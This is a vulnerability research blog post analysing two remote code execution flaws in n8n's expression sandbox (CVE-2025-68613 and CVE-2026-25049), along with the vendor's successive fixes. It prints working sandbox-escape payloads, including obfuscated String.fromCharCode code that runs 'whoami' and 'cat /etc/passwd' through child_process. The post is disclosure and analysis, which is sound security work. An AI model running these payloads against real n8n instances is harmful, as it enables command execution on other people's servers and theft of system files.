---
title: 'n8n RCE(s): A Tale of 4 Acts (CVE-2025-68613 & CVE-2026-25049)'
author: Fatih Çelik
date: 2026-02-04 01:00:00 +0300
categories: [Vulnerability Research]
tags: [vulnerability research]
math: true
mermaid: true
description: "A detailed analysis of CVE-2025-68613 and CVE-2026-25049 in n8n, covering the initial RCE, the first patch, and the subsequent bypass techniques using Template Literals and Object Destructuring."
---

- Advisory: [CVE-2025-68613](https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp)
- Advisory: [CVE-2026-25049](https://github.com/n8n-io/n8n/security/advisories/GHSA-6cqr-8cfr-67f8)

I’m a bit late to the party with this one, but I wanted to combine the two vulnerabilities I discovered into a single post (actually, they could be considered the same vulnerability, as the second one is just a bypass for the initial fix). Let’s dive in. 

*P.S. I didn't exactly have a plan for Act-IV onwards. So, stay tuned, that part is a surprise!*

*A huge thanks to the n8n team, they handled the entire process perfectly.*

**TL;DR**

- **Act I (CVE-2025-68613):** I managed to escape the sandbox just by using `this` inside a function. It turns out, that simple trick leaked the whole `process` object.
- **Act II (The First Bypass):** They tried to patch it, but I found a workaround. I used backticks (Template Literals) to hide dangerous keywords like `constructor` from their security checks.
- **Act III (The Flawed Fix Analysis):** I take a close look at their second attempt to fix it. Spoiler: they had a logic error that let my backtick trick work again.
- **Act IV (The Final Bypass / CVE-2026-25049):** Even after they locked down normal property access, I found one last way in. It turns out, Object Destructuring (`const { [key]: val } = obj`) was completely overlooked.

# Act - I ↔ CVE-2025-68613

Actually, before diving deep into the entire codebase, I was exploring the nodes within n8n. I noticed something similar to an expression engine inside the 'Edit Fields' node that allows running minimal Javascript. You could execute certain permitted JS codes as values by using the '={{ }}' syntax.

![image.png](/photos/n8n1.png)

Naturally, I immediately started writing some payloads containing keywords like 'constructor' and 'proto'. When I encountered the error below, I began to sense that something might go wrong. It seemed that dangerous keywords like 'constructor' were somehow being blocked. Instead of firing off hundreds of payloads one after another, I decided to pivot and focus on understanding the logic within the codebase. My ultimate goal was to gain access to the main Node.js process and execute commands on the machine under the 'node' user context.

![image.png](/photos/n8n2.png)

## Root Cause Analysis

I don't want to drag you through every single function and overstretch this post. However, I’ll still include the source-to-sink flow below for those who want to follow along or examine it in more detail. I’d like to highlight some of the mitigation attempts I noticed within the codebase. It seems n8n had already tried to block certain vectors using various methods, but unfortunately, they weren't entirely successful. Let's break it down step by step.

Source to Sink:
{% raw %}
```bash
1. User payload: "{{ (function(){ return this.process.mainModule; })() }}" // Smth. like this, the exact working payloads are provided at the end of the post.
2. expression.ts: resolveSimpleParameterValue()
   - Creates data.process = {arch, platform, ...} (NO mainModule)
   - Calls evaluateExpression(expression, data)
3. expression-evaluator-proxy.ts: evaluateExpression()
   - Calls tournament.execute(expr, data)
4. Tournament library: execute()
   - Parses expression to AST
   - Runs AST hooks (PrototypeSanitizer)
5. expression-sandboxing.ts: PrototypeSanitizer
   - Visits MemberExpression node for "mainModule"
   - Calls isSafeObjectProperty("mainModule")
6. utils.ts: isSafeObjectProperty()
   - Checks: unsafeObjectProperties.has("mainModule")
   - v1.119.1: Returns false (not in set)
   - Returns: true - allowed
7. PrototypeSanitizer: No error thrown
   - AST validation passes
8. Tournament: Executes code
   - IIFE runs: this.process.mainModule
   - Non-strict mode: this = global object
   - global.process.mainModule = real Node.js mainModule
9. RCE
```
{% endraw %}
### Layer-I: Context Sanitization

**File:** `packages/workflow/src/expression.ts`

**Function:** `resolveSimpleParameterValue` -> `initializeGlobalContext`

---

Before any code is actually checked or executed, n8n prepares what's called an "execution data object." Think of this as the environment where our code lives. To play it safe, they explicitly overwrite dangerous global objects within this data proxy.

```tsx
// packages/workflow/src/expression.ts (Line ~294)

Expression.initializeGlobalContext(data);

// ... inside initializeGlobalContext ...
data.process = { ... }; // Safe proxy
data.Function = {};     // Blocked
```

### Layer-II: Regex Validation

**File:** `packages/workflow/src/expression.ts`

---

Even after prepping the context, n8n doesn't just hand the code over to the evaluator. First, it performs a regex check on the raw expression string to catch obvious "red flag" patterns. It’s a basic one.

```tsx
// packages/workflow/src/expression.ts (Line ~304)

const constructorValidation = new RegExp(/\.\s*constructor/gm);
if (parameterValue.match(constructorValidation)) {
    throw new ExpressionError(...);
}
```

### Layer-III: Runtime Sanitization (AST & Property Allowlist)

**Files:** `expression-sandboxing.ts`, `utils.ts`

---

Finally, we hit the heavy hitters. The code is passed to the `Tournament` evaluator, which parses it into an AST (Abstract Syntax Tree) and applies runtime hooks via the `PrototypeSanitizer`. This is where they try to catch any sneaky property access that the previous layers might have missed.

```tsx
// packages/workflow/src/expression-sandboxing.ts

export const PrototypeSanitizer: ASTAfterHook = (ast, dataNode) => {
    // Wraps member expressions in runtime checks
    // Checks against 'unsafeObjectProperties' set
};
```

## **How Layers Failed?**

Despite these three layers of defense, the vulnerability exists due to a classic case of Context Leakage.

**The Bypass Mechanism**

1. **The Escape:** The exploit executes an IIFE: `(function(){ return this })()`.
2. **The Allowed Property:** The exploit then targets `this.process`.
3. **The Unsafe Object:** Here’s the catch: because `this` captures the *real* global context, `this.process` returns the *actual* Node.js `process` object instead of the neutered proxy.

```jsx
// Step 1: Escape the Sandbox via IIFE
(function(){
    // Step 2: 'this' is now the Global Object (not the safe proxy)
    // Step 3: Access 'process'. Since it's a allowed property name, it passes AST check.
    var proc = this.process; 
    
    // Step 4: Access 'mainModule'. Since top-level objects are unproxied, we get the real thing.
    var module = proc.mainModule;
    
    // Step 5: Load sensitive modules
    return module.require('child_process').execSync('whoami').toString();
})()
```

So, that covers **CVE-2025-68613**. But the story didn’t end there. After n8n patched the vulnerability and released their advisory, I decided to take a closer look at their fix, just to be sure. As it turns out, the rabbit hole went a bit deeper. Here’s what happened next.

# Act - II  ↔ Bypassing the Fix for CVE-2025-68613

As you can see in the screenshot below, the payload we cooked up in **Act - I** no longer works.

![image.png](/photos/n8n3.png)

Alright, let's break down the fix [commit](https://github.com/n8n-io/n8n/commit/08f3320). From what I can see, the n8n team implemented two distinct new additions.

### Fix-I: **`FunctionThisSanitizer`**

This new AST transformer specifically guns for **Immediately Invoked Function Expressions (IIFEs)**. The goal here is pretty straightforward: rewrite code like `(function(){...})()` into a restricted version that explicitly forces `this` to point to an empty object. It’s basically trying to strip away the context I used in my first bypass.

**`expression-sandboxing.ts`:** To do this, the sanitizer crawls through the Abstract Syntax Tree (AST) and keeps a close eye on every Call Expression, basically every single function call it encounters during the process.

```tsx
// packages/workflow/src/expression-sandboxing.ts

export const FunctionThisSanitizer: ASTBeforeHook = (ast, dataNode) => {
    astVisit(ast, {
        visitCallExpression(path) {
            const { node } = path;

            // It checks if the thing being called is a literal Function Definition.
            // it matches syntax like: (function() { ... })()
            if (node.callee.type !== 'FunctionExpression') {
                this.traverse(path);
                return; // Ignored if it's not a direct function expression
            }

            // If it is a FunctionExpression, it rewrites the call to use .call()
            // Before: (function() { return this })()
            // After:  (function() { return this }).call({ process: {} })
            
            const callExpression = b.callExpression(
                b.memberExpression(node.callee, b.identifier('call')),
                [EMPTY_CONTEXT, ...node.arguments],
            );
            path.replace(callExpression);
            return false;
        },
    });
};
```

By forcing `.call({ process: {} })`, `this` inside the function becomes that safe object instead of the global object.

### Fix-II: **Property Blocklist Expansion**

Looking at this fix commit, we can see that three new additions were made to the **'unsafeObjectProperties'** list.

```tsx
// packages/workflow/src/utils.ts
const unsafeObjectProperties = new Set([
	'__proto__',
	'prototype',
	'constructor',
	'getPrototypeOf',
	'mainModule', // NEW
	'binding', // NEW
	'_load', // NEW
]);
```

### Bypass the Fix

Let me cut to the chase: Yes, it’s bypassable. And here’s the payload. Now, let’s talk about how this works and try to understand why the existing fixes couldn't stop it.
{% raw %}
```tsx
{{ Object[`constr${'uct'}or`](String.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,91,34,109,97,105,110,34,43,34,77,111,100,117,108,101,34,93,46,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,46,101,120,101,99,83,121,110,99,40,34,99,97,116,32,47,101,116,99,47,112,97,115,115,119,100,34,41,46,116,111,83,116,114,105,110,103,40,41))() }}
```
{% endraw %}
It means,

```tsx
return process["main"+"Module"].require("child_process").execSync("cat /etc/passwd").toString()
```

---

**Analysis of PrototypeSanitizer():**

The sanitizer keeps a close eye on property access (specifically Member Expressions). It’s essentially looking for **Literal** values so it can run a static check against its blocklist.

```tsx
// packages/workflow/src/expression-sandboxing.ts

visitMemberExpression(path) {
    const node = path.node;
    
    if (!node.computed) {
        // 1: Dot notation (obj.prop)
        // ... checks identifier name ...
    } 
    else if (node.property.type === 'StringLiteral' || node.property.type === 'Literal') {
        // 2: Static Bracket notation (obj['prop'])
        if (!isSafeObjectProperty(node.property.value)) {
            throw new ExpressionError(...);
        }
    }
    // 3: Everything else (Dynamic) -> Wraps in __sanitize()
}
```

**Why It Fails (The Template Literal Bypass):**
Here’s where it gets interesting. The bypass payload uses a `TemplateLiteral` (those handy backticks), which surprise, is neither a `StringLiteral` nor a simple `Literal` in the eyes of the AST.

- **Exploit Code:** ```Object[`constr${'uct'}or`]```
- **AST Node Type:** `TemplateLiteral`
- **The Mismatch:** The `else if` block is only hunting for `StringLiteral || Literal.` Since we’re using backticks, it sails right past this check.
    - The code then falls through to the dynamic wrapper (`__sanitize`).
    - Since the static check was skipped, we’re relying on the runtime wrapper to catch it. However, if the `__sanitize` function doesn't evaluate the template literal *until* the very moment of access, or if the property name is constructed dynamically, the `constructor` keyword slips through the defense. The payload effectively hides the "forbidden" word until it’s too late for the sandbox to react.

---

**Analysis of FunctionThisSanitizer():**

The second part of the fix introduced a new sanitizer specifically designed to intercept function calls and bind `this` to something harmless.

```tsx
// packages/workflow/src/expression-sandboxing.ts (Commit 08f3320)

visitCallExpression(path) {
    const { node } = path;

    // Is the callee a function definition?
    if (node.callee.type !== 'FunctionExpression') {
		    this.traverse(path);
        return; // Ignore if it's not a function definition (function(){...})
    }

    // Rewrite to force empty context
    // (function(){...})  ->  (function(){...}).call(EMPTY_CONTEXT)
}
```

**Why It Fails (The Dynamic Function Bypass):**
The problem here is that the sanitizer is being a bit too narrow-minded. It’s only looking for traditional function definitions, but my payload creates a function dynamically using the Constructor.

- **Exploit:** `Object['constructor'](...)()`
    - Essentially, this is just an another way of doing: `(new Function(...))()`
- **AST Analysis:**
    - In this scenario, the `callee` is `Object['constructor'](...)`.
    - In the eyes of the AST, this is a `CallExpression` (the result of a call), not a `FunctionExpression`.
- **Result:** The `if` condition triggers, `this.traverse(path)` runs to check the children, but then the code hits that **`return`** statement.
- **Final:** Because it returns early, the critical transformation, the part that adds `.call(EMPTY_CONTEXT)` ,gets completely skipped for this specific call. The function then executes with the default global context, and just like that, we're back in control.

---

**Analysis of Blocklist - unsafeObjectProperties:**

The fix focused on blocking specific property names that I used in the first exploit.

```tsx
// packages/workflow/src/utils.ts
const unsafeObjectProperties = new Set([
    ...
    'mainModule', // Added in fix
    'binding',    // Added in fix
    '_load',      // Added in fix
]);
```

**Why It Fails:**
The problem with blocklisting strings is that I don't have to provide them upfront. The payload simply constructs the string "mainModule" at runtime.

- **Exploit Code:** Using `String.fromCharCode(...)` or simple concatenation like `"main" + "Module"`.
- **Static View:** The AST only sees a function call or a binary expression. It *never* actually sees the static string literal `"mainModule"`.
- **The Result:** Since the sanitizer and the blocklist check are looking for static strings, they wave this code through as "safe." By the time the code actually runs, the string is assembled and used to access the property on the *already leaked* global object.

**Conclusion:**

In the end, the fix failed because it built walls against specific **AST Node Types** (`StringLiteral`, `FunctionExpression`) while leaving the gates wide open for their semantic equivalents (`TemplateLiteral`, `CallExpression`). As an attacker, I simply swapped out the AST node types to achieve the exact same runtime behavior.

# Act-III ↔ Another Fix

Team prepared a new [fix commit](https://github.com/n8n-io/n8n/commit/913e5f1215b272194bcba47e09b908f0805fe214). Let’s analyze this one.

---

**The Logic Flow:**
The old code essentially relied on a three-gate system, but it left a massive "hole" at the very end. Here’s how the logic was supposed to work:

1. **Gate 1: Is it Dot Notation?** (`obj.prop`)
    - **Action:** Check "prop" against the blocklist. Simple enough.
2. **Gate 2: Is it a String Literal?** (`obj['prop']`)
    - **Action:** Check the string against the blocklist. Still safe.
3. **Gate 3 (Flaw): Is the property type something that is not a Literal?**
    - **The Logic:** `!type.endsWith('Literal')`
    - **The Intent:** Wrap complex stuff like variables (`obj[x]`) or calculations (`obj[1+2]`) in a dynamic sanitizer.
    - **The Assumption:** "If the type name ends in 'Literal', it’s either already been checked or it’s harmless."

**Why It Failed for Template Literals:**
When I threw a `TemplateLiteral` at it, the whole system came crashing down:

- **Input:** ```Object[`constr${'uct'}or`]```
- **Gate 1:** No.
- **Gate 2:** No (It’s a `TemplateLiteral`, not a `StringLiteral`).
- **Gate 3:**
    - **Type Name:** `"TemplateLiteral"`
    - **The Check:** Does it not end with "Literal"?
    - **Result:** **False**. (Because "TemplateLiteral" *does* end with "Literal").
    - **Action:** **Skip wrapping.**

The code basically fell off the edge of the `if/else` chain. It wasn't checked statically, and it wasn't wrapped dynamically. It just executed raw, giving me a straight shot at the constructor.

```tsx
// The Flawed Code Block in verifyMemberExpression
else if (!node.property.type.endsWith('Literal')) { 
    // This block catches variables and expressions.
    // It purposefully skips anything named "...Literal".
    // Since "TemplateLiteral" ends in "Literal", it skipped this block.
    path.replace(/* Wrap in sanitizer */);
}
// <--- Template Literals effectively exited here with NO checks.

```

---

**The Fixed Logic:**

The fix removed the flawed Gate 3. Now it is a simple "Catch-All”

```tsx
// The Fixed Code Block
else {
    // No assumptions. If it wasn't caught in Gate 1 or Gate 2, 
    // it goes to the runtime guard.
    path.replace(/* Wrap in sanitizer */);
}
```

**How The Fix Stops the Payload:**

**Scenario:** The attacker uses ```Object[`constr${'uct'}or`]```.

1. Gate 1: Is it Dot Notation? -> No.
2. Gate 2: Is it a String Literal? -> No.
3. Gate 3 (The New Fix): Everything else? -> Yes.
    - **Action:** Wrap it in `__sanitize(...)`.

**The Result:**
The code is now rewritten to ```Object[__sanitize(`constr${'uct'}or`)]```. At runtime, the "constructor" keyword is finally detected and blocked.

## *-Fake-* Conclusion

At the end of the day, this whole thing came down to a simple but dangerous assumption: thinking that if an AST node's name ended in "Literal", it was automatically "safe". My use of a `TemplateLiteral` showed that this was a huge blind spot in the defense logic.

The new fix finally flips the script by enforcing a "Default Deny**"** policy. Now, unless a node is explicitly verified as safe, n8n just wraps it by default.

Actually, the post was supposed to end here. But then I thought, why not look for another bypass? I think I found one, and honestly, I was too lazy to move the 'Conclusion' section. So, let’s keep the momentum going. Welcome to Act-IV!

# Act-IV: Bypassing the Second Fix

Right, I think things are starting to get a bit complicated at this point, so let me take a second to recap.

| **Stage** | **Vulnerability / Bypass** |
| --- | --- |
| **Act I** | Initial Discovery (CVE-2025-68613) |
| **Act II** | First Bypass |
| **Act III** | Analysis of the Second Fix |
| **Act IV** | Second Bypass |

Alright, we’ve already covered what the fix was in **Act-III**, so now let's talk about the actual problem.

Despite the security patches applied in [this commit](https://github.com/n8n-io/n8n/commit/913e5f1215b272194bcba47e09b908f0805fe214) which definitely hardened standard property access, the n8n expression sandbox is still vulnerable to RCE. The flaw resides in the Object Destructuring logic of the AST Sanitizer (`expression-sandboxing.ts`), which fails to correctly sanitize 'Computed Property Keys' when they aren't simple literals.

The file `packages/workflow/src/expression-sandboxing.ts` contains a visitor method `visitObjectPattern` to sanitize destructuring assignments.
{% raw %}
```tsx
visitObjectPattern(path) {
    this.traverse(path);
    const node = path.node;

    for (const prop of node.properties) {
        if (prop.type === 'Property') {
            let keyName: string | undefined;

            if (prop.key.type === 'Identifier') {
                keyName = prop.key.name;
            } else if (prop.key.type === 'StringLiteral' || prop.key.type === 'Literal') {
                keyName = String(prop.key.value);
            }

            // Problem is here: 
            // If the key is a TemplateLiteral (e.g. { [`a`]: val }), keyName remains undefined.
            
            // The security check assumes keyName was found. If undefined, it skips the check.
            if (keyName !== undefined && !isSafeObjectProperty(keyName)) {
                throw new ExpressionDestructuringError(keyName);
            }
        }
    }
}
```
{% endraw %}
This payload works by abusing that logic gap I mentioned above. Here is how:

1.  **Hiding the Key with Template Literals:**
    The sanitizer thinks, "If I can't figure out the key name, I'll just assume it's safe." So, I used a Template Literal key (like `` [`constr${'uct'}or`] ``). Since the code couldn't resolve this name, it returned `undefined` and skipped the security check entirely. This gave me direct access to `Object.constructor`.

2.  **Building the Payload on the Fly:**
    As always, directly writing `require('child_process')` would get caught by other checks. So, I used `String.fromCharCode` to build the malicious code at runtime. This way, the static analysis tools see nothing suspicious until the code actually runs.

{% raw %}
```jsx
{{
(() => {
    // 1. AST Bypass: Extract 'Function' constructor
    // The sanitizer sees a TemplateLiteral key, fails to resolve name, and allows it.
    const { [`constr${'uct'}or`]: Fn } = Object;

    // 2. Dynamic Payload Construction (cat /etc/passwd)
    // Means: return process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()
    const payload = String.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,101,116,99,47,112,97,115,115,119,100,39,41,46,116,111,83,116,114,105,110,103,40,41);

    // 3. Execution
    return Fn(payload)();
})()
}}
```
{% endraw %}
## - Real - Conclusion

Along with this advisory [CVE-2026-25049](https://github.com/n8n-io/n8n/security/advisories/GHSA-6cqr-8cfr-67f8), the bypass methods I demonstrated above have been fixed, and n8n has released a new advisory. To be honest, I can’t say I’ve had the time to dive deep into the latest commit just yet :) It’s been a long post. Thanks for reading this far!